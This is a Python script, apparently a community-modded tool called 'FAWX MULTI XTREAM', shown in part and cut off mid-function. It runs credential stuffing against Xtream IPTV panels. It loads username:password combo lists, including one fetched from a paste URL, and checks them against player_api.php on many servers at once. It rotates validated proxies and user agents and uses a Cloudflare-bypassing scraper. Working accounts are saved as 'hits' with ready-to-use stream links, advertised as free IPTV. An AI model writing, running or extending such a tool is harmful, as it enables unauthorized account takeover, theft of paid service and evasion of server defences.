# --------------------------------------------------------------------
# FAWX MULTI XTREAM
# MODDED BY 👺𝐅𝐀𝐖𝐗🤴
# TELEGRAM ➻ t.me/+knGWqSfahTxkZTVk
# --------------------------------------------------------------------

from datetime import datetime, timedelta
import queue
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import cfscrape
import json
import logging
import os
import platform
import random
import re
import subprocess
import sys
import threading
import time
from colorama import init, Fore, Back, Style
from urllib.parse import urlparse
import socket

init()

APP_NAME = 'FAWX MULTI XTREAM'
VERSION = '1.0'
PREDEFINED_COMBO_ONLINE_URL = "http://bin.shortbin.eu:8080/raw/aMC7kTdtwQ"

if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(f"{APP_NAME} {VERSION}")
else:
    sys.stdout.write(f"\x1b]2;{APP_NAME} {VERSION}\x07")

class Colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    ORANGE = '\033[38;5;208m'
    GRAY = '\033[90m'

AVAILABLE_SERVER_COLORS = [
    Colors.BRIGHT_GREEN, Colors.BRIGHT_CYAN, Colors.BRIGHT_YELLOW,
    Colors.BRIGHT_MAGENTA, Colors.BRIGHT_BLUE, Colors.ORANGE, Colors.RED,
    Colors.GREEN, Colors.CYAN, Colors.YELLOW, Colors.BLUE, Colors.MAGENTA,
    Colors.WHITE, Colors.BRIGHT_RED, Colors.GRAY
]
AVAILABLE_HITS_COLORS = [
    Colors.BRIGHT_GREEN, Colors.BRIGHT_CYAN, Colors.BRIGHT_YELLOW,
    Colors.BRIGHT_BLUE, Colors.MAGENTA, Colors.RED,
    Colors.GREEN, Colors.CYAN, Colors.YELLOW, Colors.BLUE
]
FINAL_SUMMARY_COLORS = [
    Colors.BRIGHT_GREEN, Colors.BRIGHT_CYAN, Colors.BRIGHT_YELLOW,
    Colors.BRIGHT_MAGENTA, Colors.BRIGHT_BLUE, Colors.ORANGE, Colors.RED
]

def get_random_color(color_list, exclude_colors=None):
    if exclude_colors is None:
        exclude_colors = []
    available = [c for c in color_list if c not in exclude_colors]
    if not available:
        return Colors.RESET
    return random.choice(available)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    banner = f"""
{Colors.BRIGHT_RED}========================================{Colors.GREEN}
       ✮ 𝐅𝐀𝐖𝐗 𝐌𝐔𝐋𝐓𝐈 𝐗𝐓𝐑𝐄𝐀𝐌 ✮    {Colors.MAGENTA}\n         𝐌𝐎𝐃𝐃𝐄𝐃 𝐁𝐘   {Colors.WHITE}👺𝐅𝐀𝐖𝐗🤴     {Colors.BRIGHT_RED}
========================================{Colors.RESET}"""
    print(banner)

def check_installation(package):
    try:
        __import__(package)
        return True
    except ImportError:
        return False

def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ]
    return random.choice(user_agents)

def get_country_flag(timezone_name="", country_code=""):
    country_flags = {
        "BR": "🇧🇷", "US": "🇺🇸", "CA": "🇨🇦", "GB": "🇬🇧", "DE": "🇩🇪",
        "FR": "🇫🇷", "ES": "🇪🇸", "PT": "🇵🇹", "AR": "🇦🇷", "MX": "🇲🇽",
        "CO": "🇨🇴", "CL": "🇨🇱", "PE": "🇵🇪", "VE": "🇻🇪", "EC": "🇪🇨",
        "BO": "🇧🇴", "PY": "🇵🇾", "UY": "🇺🇾", "AU": "🇦🇺", "NZ": "🇳🇿",
        "IN": "🇮🇳", "CN": "🇨🇳", "JP": "🇯🇵", "KR": "🇰🇷", "RU": "🇷🇺",
        "ZA": "🇿🇦", "SE": "🇸🇪", "UA": "🇺🇦", "IT": "🇮🇹"
    }
    if country_code and country_code.upper() in country_flags:
        return country_flags[country_code.upper()]
    if "Sao_Paulo" in timezone_name or "Brazil" in timezone_name:
        return "🇧🇷"
    elif "America/" in timezone_name:
        return "🇺🇸"
    elif "Europe/" in timezone_name:
        return "🇪🇺"
    elif "Asia/" in timezone_name:
        return "🌏"
    elif "Africa/" in timezone_name:
        return "🌍"
    return "🌎"

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.proxy_queue = queue.Queue()
        self.bad_proxies = set()
        self.proxy_lock = threading.Lock()
        self.proxy_type = None
        self.proxy_file = None
        self.proxy_type_map = {
            '1': 'IpVanish',
            '2': 'SOCKS4',
            '3': 'SOCKS5',
            '4': 'HTTP/HTTPS'
        }

    def load_proxies(self, file_path, proxy_type_id):
        try:
            with open(file_path, 'r') as f:
                proxies = [line.strip() for line in f if ':' in line]
            self.proxy_type = proxy_type_id
            self.proxy_file = file_path
            clear_screen()
            show_banner()
            print(f"\n{Colors.BRIGHT_YELLOW}===== PROXY VALIDATION =====")
            print(f"{Colors.BRIGHT_CYAN}File: {Colors.ORANGE}{os.path.basename(file_path)}")
            print(f"{Colors.BRIGHT_CYAN}Type: {Colors.ORANGE}{self.proxy_type_map[proxy_type_id]}")
            print(f"{Colors.BRIGHT_CYAN}Total: {Colors.ORANGE}{len(proxies)} proxies")
            print(f"{Colors.BRIGHT_YELLOW}============================")
            
            valid_proxies = []
            threads = []
            lock = threading.Lock()
            test_count = [0]
            
            print("\n" * 7) 
            
            proxy_status_log = []

            def update_display():
                with lock:
                    print("\033[s", end="") 
                    print("\033[7A", end="") 
                    
                    valid_count = len(valid_proxies)
                    tested_count = test_count[0]
                    percentage = (tested_count / len(proxies)) * 100 if proxies else 0
                    
                    print("\033[K", end="")
                    print(f"{Colors.BRIGHT_CYAN}Tested:    {Colors.ORANGE}{tested_count}{Colors.RESET}/{len(proxies)}")
                    print("\033[K", end="")
                    print(f"{Colors.BRIGHT_CYAN}Valid:     {Colors.BRIGHT_GREEN}{valid_count}{Colors.RESET}")
                    print("\033[K", end="")
                    print(f"{Colors.BRIGHT_CYAN}Progress:  {Colors.ORANGE}{percentage:.1f}%{Colors.RESET}")
                    print("\033[K", end="")
                    print(f"{Colors.BRIGHT_YELLOW}LAST TESTED PROXIES:{Colors.RESET}")

                    display_count = min(3, len(proxy_status_log))
                    for i in range(-display_count, 0):
                        proxy, status, speed = proxy_status_log[i]
                        color = Colors.BRIGHT_GREEN if status == "VALID" else Colors.BRIGHT_RED
                        speed_display = f"{speed:.2f}s" if speed else "N/A"
                        print(f"\033[K{proxy[:25]:<25} {color}{status:<8}{Colors.RESET} {speed_display}")
                    
                    for _ in range(3 - display_count):
                        print("\033[K")

                    print("\033[u", end="") 
                    sys.stdout.flush()

            def test_proxy(proxy):
                start_time = time.time()
                status = "💔INVALID"
                try:
                    session = requests.Session()
                    session.proxies = self.format_proxy(proxy)
                    session.verify = False

                    test_urls = ['http://ip-api.com/json/', 'http://httpbin.org/ip', 'https://api.ipify.org?format=json']
                    random.shuffle(test_urls)
                    
                    for url in test_urls:
                        try:
                            response = session.get(url, timeout=3)
                            if response.status_code == 200 and response.text.strip():
                                status = "💚VALID"
                                break
                        except:
                            continue
                except Exception:
                    status = "💔FAILED"
                finally:
                    end_time = time.time()
                    speed = end_time - start_time
                    with lock:
                        test_count[0] += 1
                        proxy_status_log.append((proxy, status, speed))
                    update_display()
                
                if status == "💚VALID":
                    with lock:
                        valid_proxies.append(proxy)
            
            for proxy in proxies:
                t = threading.Thread(target=test_proxy, args=(proxy,))
                t.daemon = True
                threads.append(t)
                t.start()
                time.sleep(0.01) 
            
            for t in threads:
                t.join(timeout=10)

            update_display() 
            
            print(f"\n{Colors.BRIGHT_GREEN}Validation Complete!{Colors.RESET}")
            print(f"{Colors.BRIGHT_CYAN}Valid Proxies Found: {Colors.BRIGHT_GREEN}{len(valid_proxies)}/{len(proxies)}{Colors.RESET}")
            input(f"{Colors.BRIGHT_YELLOW}\nPress ENTER To Continue...{Colors.RESET}")

            self.proxies = valid_proxies
            for proxy in valid_proxies:
                self.proxy_queue.put(proxy)
            
            return len(self.proxies)
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}Error Loading Proxies: {e}{Colors.RESET}")
            return 0

    def format_proxy(self, proxy):
        if self.proxy_type == '1': 
            parts = proxy.split(':')
            if len(parts) == 4:
                return {'http': f'socks5://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                        'https': f'socks5://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'}
        elif self.proxy_type == '2': 
            return {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'}
        elif self.proxy_type == '3': 
            return {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
        elif self.proxy_type == '4': 
            return {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
        return None

    def get_proxy_type_display(self):
        return self.proxy_type_map.get(self.proxy_type, 'Unknown')

    def get_proxy(self):
        if self.proxy_queue.empty():
            return None
        try:
            proxy = self.proxy_queue.get_nowait()
            if proxy in self.bad_proxies:
                return self.get_proxy()
            return proxy
        except queue.Empty:
            return None

    def report_bad_proxy(self, proxy):
        with self.proxy_lock:
            self.bad_proxies.add(proxy)

    def return_proxy(self, proxy):
        if proxy and proxy not in self.bad_proxies:
            self.proxy_queue.put(proxy)

class FawxScanner:
    def __init__(self):
        self.servers = []
        self.combo_lines = []
        self.combo_file_name = ""
        self.nickname = "👺𝐅𝐀𝐖𝐗🤴"
        self.attack_type = "Standard"
        self.num_bots = 20
        self.proxy_manager = ProxyManager()
        self.use_proxy = False
        self.start_time = time.time()
        self.scraper = cfscrape.create_scraper()
        self.lock = threading.Lock()
        self.active_bots = 0
        self.setup_directories()

    def setup_directories(self):
        if platform.system() == "Windows":
            base_dir = os.path.dirname(os.path.abspath(__file__))
        elif platform.system() == "Darwin":
            base_dir = os.path.join(os.path.expanduser("~"), "Documents")
        else: 
            base_dir = os.path.join(os.path.expanduser("~"), "Documents") if os.path.isdir(os.path.join(os.path.expanduser("~"), "Documents")) else "/sdcard"
        
        self.hits_dir = os.path.join(base_dir, "Hits/✮ 𝐅𝐀𝐖𝐗 𝐌𝐔𝐋𝐓𝐈 𝐗𝐓𝐑𝐄𝐀𝐌 ✮", "HITS")
        self.combo_dir = os.path.join("/storage/emulated/0/combo")
        self.proxy_dir = os.path.join(base_dir, "/storage/emulated/0/proxies")
        for directory in [self.hits_dir, self.combo_dir, self.proxy_dir]:
            os.makedirs(directory, exist_ok=True)

    def configure_servers(self):
        print(f"\n{Colors.BRIGHT_YELLOW}Multi-Server Configuration:{Colors.RESET}")
        while True:
            num_servers_input = input(f"{Colors.BRIGHT_CYAN}¿Cuántos servidores desea verificar? (1 o más, se recomienda hasta 100 por estabilidad): \n{Colors.RESET}").strip()
            try:
                num_servers = int(num_servers_input)
                if num_servers >= 1:
                    if num_servers > 100:
                        print(f"{Colors.BRIGHT_YELLOW}Advertencia: Usar más de 100 servidores puede afectar el rendimiento y la estabilidad.{Colors.RESET}")
                        confirm = input(f"{Colors.BRIGHT_CYAN}¿Desea continuar con {num_servers} servidores? (s/n): {Colors.RESET}").strip().lower()
                        if confirm not in ('s', 'si', 'y', 'yes'):
                            continue
                    break
                else:
                    print(f"{Colors.BRIGHT_RED}¡Número inválido! Por favor, ingrese un número de 1 o más.{Colors.RESET}")
            except ValueError:
                print(f"{Colors.BRIGHT_RED}¡Entrada inválida! Por favor, ingrese un número válido.{Colors.RESET}")

        used_colors = []
        for i in range(num_servers):
            server_name_color = get_random_color(AVAILABLE_SERVER_COLORS, exclude_colors=used_colors)
            if server_name_color == Colors.RESET:
                server_name_color = Colors.BRIGHT_CYAN
            used_colors.append(server_name_color)

            server = {
                'url': '', 'ip': 'N/A', 'status': 'Offline', 'timezone': 'N/A',
                'country_code': '', 'total_hits': 0, 'total_tested': 0,
                'hits_file_path': '', 'hits_file_created': False,
                'current_http_status': 'N/A', 'current_http_status_color': Colors.GRAY,
                'current_proxy': 'None', 'last_tested_username': 'N/A',
                'last_tested_password': 'N/A', 'server_name_color': server_name_color,
            }
            server['hits_color'] = get_random_color(AVAILABLE_HITS_COLORS, exclude_colors=[server_name_color])

            while True:
                server_url_input = input(f"\n{server_name_color}Servidor {i+1} (ejemplo, domain.com:8080 o http://domain.com:8080):\n{Colors.RESET}").strip()
                if server_url_input and '.' in server_url_input:
                    server['url'] = server_url_input
                    if not server['url'].startswith('http'):
                        server['url'] = 'http://' + server['url']
                    break
                else:
                    print(f"{Colors.BRIGHT_RED}¡Servidor inválido! Por favor, ingrese un servidor válido (ejemplo, domain.com:8080).{Colors.RESET}")

            self.get_server_info(server)
            parsed_url = urlparse(server['url'])
            portal_cleaned = re.sub(r'[^a-zA-Z0-9_.-]', '', parsed_url.netloc)
            timestamp = datetime.now().strftime('%H%M_%d%m%Y')
            server['hits_file_path'] = os.path.join(self.hits_dir, f"[👺]{portal_cleaned}_{self.nickname}_{timestamp}.txt")
            self.servers.append(server)

    def get_server_info(self, server):
        hostname = urlparse(server['url']).hostname
        if not hostname: return
        try:
            server['ip'] = socket.gethostbyname(hostname)
            try:
                requests.head(server['url'], timeout=5, verify=False)
                server['status'] = "💚ONLINE"
            except requests.exceptions.RequestException:
                server['status'] = "💔OFFLINE"
            
            try: 
                response = requests.get(f"http://ip-api.com/json/{server['ip']}", timeout=5, verify=False)
                if response.ok:
                    data = response.json()
                    if data.get('status') == 'success':
                        server['timezone'] = data.get('timezone', 'N/A')
                        server['country_code'] = data.get('countryCode', '')
            except: pass
        except Exception: pass

    def load_combo_from_file(self, file_path):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                self.combo_lines = [line.strip() for line in f if ':' in line]
            self.combo_file_name = os.path.basename(file_path)
            return len(self.combo_lines)
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}Error al cargar combo: {e}{Colors.RESET}")
            return 0

    def load_combo_online(self, url):
        print(f"{Colors.BRIGHT_YELLOW}Por favor, espera, descargando combo en línea...{Colors.RESET}")
        animation = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
        idx = 0
        start_time_dl = time.time()
        
        response = None
        def download_task():
            nonlocal response
            try:
                response = requests.get(url, headers={'User-Agent': get_random_user_agent()}, timeout=20, verify=False)
            except Exception: pass
        
        t = threading.Thread(target=download_task)
        t.daemon = True
        t.start()
        
        while t.is_alive():
            print(f"\r{Colors.BRIGHT_CYAN}{animation[idx]} {Colors.ORANGE}Descargando... "
                  f"{time.time()-start_time_dl:.1f}s{Colors.RESET}", end="")
            idx = (idx + 1) % len(animation)
            time.sleep(0.1)
        
        print("\r" + " " * 40 + "\r", end="") 
        
        if response and response.ok:
            self.combo_lines = [line.strip() for line in response.text.splitlines() if ':' in line]
            self.combo_file_name = "Online_Combo"
            print(f"{Colors.BRIGHT_GREEN}✓ Combo en línea cargado con éxito!{Colors.RESET}")
            print(f"{Colors.ORANGE}Total de cuentas: {Colors.BRIGHT_CYAN}{len(self.combo_lines)}{Colors.RESET}")
            return len(self.combo_lines)
        else:
            http_error = response.status_code if response is not None else "N/A"
            print(f"{Colors.BRIGHT_RED}✗ Error HTTP {http_error} al descargar combo en línea.{Colors.RESET}")
            return 0

    def get_http_status_color(self, status_code_text):
        try:
            status_code = int(status_code_text)
            if status_code == 200: return Colors.BRIGHT_GREEN
            if 400 <= status_code < 500: return Colors.YELLOW
            if 500 <= status_code < 600: return Colors.BRIGHT_RED
            return Colors.BRIGHT_CYAN
        except (ValueError, TypeError):
            return Colors.RED

    def check_account(self, server, username, password):
        url = f"{server['url']}/player_api.php?username={username}&password={password}"
        proxy_formatted, proxy_raw = None, None
        try:
            if self.use_proxy:
                proxy_raw = self.proxy_manager.get_proxy()
                if proxy_raw:
                    proxy_formatted = self.proxy_manager.format_proxy(proxy_raw)
            
            with self.lock:
                server['last_tested_username'] = username
                server['last_tested_password'] = password
                server['current_proxy'] = proxy_raw.split('@')[-1] if self.use_proxy and proxy_raw else "None"

            response = self.scraper.get(url, headers={'User-Agent': get_random_user_agent()}, proxies=proxy_formatted, timeout=15, verify=False)
            
            with self.lock:
                server['current_http_status'] = str(response.status_code)
                server['current_http_status_color'] = self.get_http_status_color(str(response.status_code))

            if response.status_code == 200:
                data = response.json()
                if data.get('user_info', {}).get('status') == 'Active':
                    exp_date = data.get('user_info', {}).get('exp_date')
                    if exp_date is not None:
                        try:
                            with self.lock:
                                server['total_hits'] += 1
                                self.save_hit(server, username, password, data)
                            return True
                        except (ValueError, TypeError):
                             pass 

        except (requests.exceptions.RequestException, json.JSONDecodeError):
            with self.lock:
                server['current_http_status_color'] = Colors.RED
            if self.use_proxy and proxy_raw:
                self.proxy_manager.report_bad_proxy(proxy_raw)
        finally:
            if self.use_proxy and proxy_raw:
                self.proxy_manager.return_proxy(proxy_raw)
        return False

    def save_hit(self, server, username, password, data):
        parsed_url = urlparse(server['url'])
        portal_base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        user_info = data.get('user_info', {})

        exp_date_ts = user_info.get('exp_date')
        exp_date_str = "👺✧[UNLIMITED]✧🤴"
        exp_status_formatted = ""
        if exp_date_ts is not None and str(exp_date_ts).strip().lower() not in ["", "null", "0"]:
            try:
                exp_dt = datetime.fromtimestamp(int(exp_date_ts))
                exp_date_str = exp_dt.strftime('%d/%m/%Y')
                remaining_days = (exp_dt - datetime.now()).days
                if remaining_days > 0:
                    exp_status_formatted = f"𝙳𝙰𝚈𝚂 𝚁𝙴𝙼𝙰𝙸𝙽𝙸𝙽𝙶➻ {remaining_days} 𝙳𝙰𝚈𝚂"
                else:
                    exp_status_formatted = f"Expiró hace {abs(remaining_days)} días"
            except (ValueError, TypeError):
                exp_date_str = "Fecha inválida"

        created_at_ts = user_info.get('created_at')
        created_at_str = "Desconocido"
        if created_at_ts:
            try:
                created_at_str = datetime.fromtimestamp(int(created_at_ts)).strftime('%d/%m/%Y')
            except (ValueError, TypeError):
                created_at_str = "Fecha inválida"
        
        active_cons = user_info.get('active_cons', 0)
        max_cons = user_info.get('max_connections', 0)
        flag = get_country_flag(server['timezone'], server['country_code'])
        city = server['timezone'].split('/')[-1].replace('_', ' ') if '/' in server['timezone'] else server['timezone']
        timezone_display = f"{city} {flag}" if city != "N/A" else "N/A"

        link_m3u = f"{portal_base_url}/get.php?username={username}&password={password}&type=m3u_plus&output=ts"
        link_epg = f"{portal_base_url}/xmltv.php?username={username}&password={password}"

        detailed_content = f"""
┏•━•━•━•━•━•━•━•━•━•━•━•━•━•┓
  ✮ 𝐅𝐀𝐖𝐗 𝐌𝐔𝐋𝐓𝐈 𝐗𝐓𝐑𝐄𝐀𝐌 ✮
┗•━•━•━•━•━•━•━•━•━•━•━•━•━•┛
┏━━━━━━ ✮[ 👺 ]✮ ━━━━━━┓
┣✧𝚂𝙲𝙰𝙽 𝙳𝙰𝚃𝙴➻ {datetime.now().strftime('%H:%M:%S ⁃ %d/%m/%Y')}
┣✧𝙷𝙾𝚂𝚃➻ {server['url']}
┣✧𝙷𝙾𝚂𝚃 𝙸𝙿➻ {server['ip']}
┣✧𝚁𝙴𝙶𝙸𝙾𝙽➻ {timezone_display}
┣✧𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴➻ {username}
┣✧𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳➻ {password}
┣✧𝙲𝚁𝙴𝙰𝚃𝙴𝙳➻ {created_at_str}
┣✧𝙴𝙽𝙳𝚂➻ {exp_date_str}
┣✧{exp_status_formatted}
┣✧𝙰𝙲𝚃𝙸𝚅𝙴 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽𝚂➻ {active_cons}
┣✧𝙼𝙰𝚇𝙸𝙼𝚄𝙼 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽𝚂➻ {max_cons}
┗━━━━━━ ✮[ 🤴 ]✮ ━━━━━━┛
┏━━━━━━ ✮[ 👺 ]✮ ━━━━━━┓
┣✺𝙼𝟹𝚄 𝙻𝙸𝙽𝙺➻
  {link_m3u}   #𝐅𝐀𝐖𝐗
┣✺𝙴𝙿𝙶 𝙻𝙸𝙽𝙺➻
  {link_epg}   #𝐅𝐀𝐖𝐗
┗━━━━━━ ✮[ 🤴 ]✮ ━━━━━━┛
┏━━━━━━ ✮[ 👺 ]✮ ━━━━━━┓
┣☆𝙲𝙾𝙼𝙱𝙾➻ {self.combo_file_name.replace('.txt', '')}
┣☆𝚂𝙲𝙰𝙽 𝙱𝚈➻ {self.nickname}
   ─✧─ ??𝙿𝚃𝚅 𝙵𝙾𝚁 𝙵𝚁𝙴𝙴!! ─✧─
┗━━━━━━ ✮[ 🤴 ]✮ ━━━━━━┛

        """
        if not server['hits_file_created']:
            try:
                with open(server['hits_file_path'], 'w', encoding='utf-8') as f:
                    f.write(f"===== RESULTADOS DEL ESCANEO =====\nFecha: {datetime.now().strftime('%H:%M:%S - %d/%m/%Y')}\n"
                            f"Portal: {server['url']}\nNick: {self.nickname}\nAtaque: {self.attack_type}\n"
                            f"Combo: {self.combo_file_name.replace('.txt', '')}\nModificado por: 👺𝐅𝐀𝐖𝐗🤴     \n"
                            f"================================\n\n")
                server['hits_file_created'] = True
                print(f"\n{Colors.BRIGHT_GREEN}Archivo de hits creado para {urlparse(server['url']).netloc}: {server['hits_file_path']}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.BRIGHT_RED}Error al crear archivo de hits: {e}{Colors.RESET}")

        with open(server['hits_file_path'], 'a', encoding='utf-8') as f:
            f.write(detailed_content.strip() + "\n\n")

    def worker(self, server_index):
        server = self.servers[server_index]
        with self.lock:
            self.active_bots += 1
        
        try:
            while True:
                with self.lock:
                    if server['total_tested'] >= len(self.combo_lines):
                        break
                    combo_line = self.combo_lines[server['total_tested']]
                    server['total_tested'] += 1
                
                try:
                    username, password = combo_line.split(':', 1)
                    self.check_account(server, username.strip(), password.strip())
                except ValueError:
                    continue 
        finally:
            with self.lock:
                self.active_bots -= 1

    def format_time(self, seconds):
        h, rem = divmod(int(seconds), 3600)
        m, s = divmod(rem, 60)
        return f"{h:02}h {m:02}m {s:02}s"

    def update_status(self):
        total_tested = sum(s['total_tested'] for s in self.servers)
        total_hits = sum(s['total_hits'] for s in self.servers)
        combo_total = len(self.combo_lines)
        progress = (total_tested / (len(self.servers) * combo_total) * 100) if combo_total > 0 and self.servers else 0
        
        time_elapsed = time.time() - self.start_time
        cpm_total = (total_tested / max(time_elapsed, 1)) * 60
        time_remaining = ((len(self.servers) * combo_total - total_tested) / (cpm_total / 60)) if cpm_total > 0 else 0

        print("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        for i, server in enumerate(self.servers, 1):
            print(f"▋{Colors.ORANGE}Servidor {i}{Colors.RESET}     : {server['server_name_color']}{server['url']}{Colors.RESET}")
            print(f"▋{Colors.ORANGE}Estado HTTP {i}{Colors.RESET}: {server['current_http_status_color']}[{server['current_http_status']}]{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Último usuario    {Colors.RESET}: {Colors.GREEN}{self.servers[0]['last_tested_username']}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Última contraseña {Colors.RESET}: {Colors.BLUE}{self.servers[0]['last_tested_password']}{Colors.RESET}")
        for i, server in enumerate(self.servers, 1):
            print(f"▋{Colors.ORANGE}Hits Servidor {i}{Colors.RESET}: {server['hits_color']}{server['total_hits']}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Total Hits   {Colors.RESET}: {Colors.BRIGHT_GREEN}{total_hits}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Probados     {Colors.RESET}: {Colors.BRIGHT_CYAN}{total_tested} {Colors.BRIGHT_BLUE}/ {combo_total * len(self.servers)}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Progreso     {Colors.RESET}: {Colors.RED}{progress:.2f}%{Colors.RESET}")
        print(f"▋{Colors.ORANGE}CPM          {Colors.RESET}: {Colors.GREEN}{int(cpm_total)}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Bots Activos {Colors.RESET}: {Colors.ORANGE}{self.active_bots} {Colors.MAGENTA}/ {self.num_bots * len(self.servers)}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Combo        {Colors.RESET}: {Colors.BRIGHT_YELLOW}{self.combo_file_name.replace('.txt', '')}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Hits Por     {Colors.RESET}: {Colors.WHITE}{self.nickname.upper()}     {Colors.RESET}")
        if self.use_proxy:
            print(f"▋{Colors.ORANGE}Tipo de Proxy   {Colors.RESET}: {Colors.BRIGHT_YELLOW}{self.proxy_manager.get_proxy_type_display()}{Colors.RESET}")
            print(f"▋{Colors.ORANGE}Proxy en Uso    {Colors.RESET}: {Colors.CYAN}{self.servers[0]['current_proxy']}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Tiempo Transcurrido {Colors.RESET}: {Colors.CYAN}{self.format_time(time_elapsed)}{Colors.RESET}")
        print(f"▋{Colors.ORANGE}Tiempo Estimado     {Colors.RESET}: {Colors.RED}{self.format_time(time_remaining)}{Colors.RESET}\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{Colors.RESET}")

    def show_final_summary(self):
        total_time = time.time() - self.start_time
        total_tested = sum(s['total_tested'] for s in self.servers)
        total_hits = sum(s['total_hits'] for s in self.servers)
        avg_speed = total_tested / max(total_time, 1)

        clear_screen()
        show_banner()
        print(f"\n{Colors.BRIGHT_YELLOW}╔═════════════════════════════════")
        print(f"║          {Colors.ORANGE}RESUMEN FINAL{Colors.RESET}{Colors.BRIGHT_YELLOW}          ║")
        print(f"╠═════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}║{Colors.RESET} Servidores: {Colors.BRIGHT_CYAN}{len(self.servers)}{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}║{Colors.RESET} Cuentas Probadas: {Colors.BRIGHT_CYAN}{total_tested}{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}║{Colors.RESET} Total Hits: {Colors.BRIGHT_GREEN}{total_hits}{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}║{Colors.RESET} Tiempo Total: {Colors.BRIGHT_CYAN}{self.format_time(total_time)}{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}║{Colors.RESET} Velocidad Promedio: {Colors.BRIGHT_CYAN}{avg_speed:.2f} cuentas/seg{Colors.RESET}")
        print(f"{Colors.BRIGHT_YELLOW}╚═════════════════════════════════{Colors.RESET}")
        
        if self.servers:
            print(f"\n{Colors.BRIGHT_YELLOW}╔═════════════════════════════════")
            print(f"║     {Colors.ORANGE}RESULTADOS POR SERVIDOR{Colors.RESET}{Colors.BRIGHT_YELLOW}     ║")
            print(f"╠═════════════════════════════════{Colors.RESET}")
            for i, server in enumerate(self.servers, 1):
                print(f"{Colors.BRIGHT_YELLOW}║ {server['server_name_color']}Servidor {i}: {Colors.WHITE}{urlparse(server['url']).netloc}{Colors.RESET}")
                print(f"{Colors.BRIGHT_YELLOW}║   Hits: {server['hits_color']}{server['total_hits']}{Colors.RESET}")
                print(f"{Colors.BRIGHT_YELLOW}║   Líneas Probadas: {Colors.BRIGHT_CYAN}{server['total_tested']}{Colors.RESET}")
                if server['hits_file_created']:
                    print(f"{Colors.BRIGHT_YELLOW}║   Archivo de Hits: {Colors.GREEN}Guardado{Colors.RESET}")
                if i < len(self.servers):
                    print(f"{Colors.BRIGHT_YELLOW}║ -------------------------------")
            print(f"{Colors.BRIGHT_YELLOW}╚═════════════════════════════════{Colors.RESET}")

    def configure_proxies(self):
        proxy_files = [f for f in os.listdir(self.proxy_dir) if f.endswith('.txt')]
        if not proxy_files:
            print(f"{Colors.BRIGHT_RED}No se encontraron archivos de proxy en el directorio {self.proxy_dir}{Colors.RESET}")
            self.use_proxy = False
            return
        
        print(f"\n{Colors.BRIGHT_YELLOW}Archivos de Proxy Disponibles:{Colors.RESET}")
        for i, file in enumerate(proxy_files, 1):
            print(f"{Colors.BRIGHT_CYAN}[{i}] {Colors.ORANGE}{file}{Colors.RESET}")
        choice = input(f"\n{Colors.BLUE}Seleccione el archivo de proxy: {Colors.RESET}").strip()
        
        try:
            choice_idx = int(choice) - 1
            if 0 <= choice_idx < len(proxy_files):
